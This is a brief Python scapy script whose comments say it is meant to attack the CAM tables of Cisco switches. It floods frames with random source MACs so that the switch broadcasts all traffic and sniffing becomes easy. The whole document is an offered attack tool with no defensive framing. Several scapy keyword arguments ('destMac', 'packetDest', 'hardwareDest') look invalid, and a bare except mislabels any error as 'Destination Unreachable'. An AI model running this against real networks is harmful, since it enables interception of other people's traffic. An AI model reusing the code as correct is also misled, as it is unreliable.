# The purpose of this script is to attack the CAM tables in Cisco switches.
# Once a CAM table becomes full the switch will act the same way as a hub.
# This will allow all packets to be sent to every port making it much easier
# to sniff network traffic as it then broadcasts the packets all ports. 

from scapy.all import *
noOfPackets = int(input("Please enter the number of packets to be sent: "))
intName = input("Please enter the desired interface: ")
ePackets = Ether(src=RandMAC(), destMac="ff:ff:ff:ff:ff:ff")
aPackets = ARP(packetDest="10.10.10.10",hardwareDest="ff:ff:ff:ff:ff:ff")
try:
    sendp(ePackets/aPackets, iface=intName,count=noOfPackets,inter=.001)
except:
    print("Destination Unreachable")
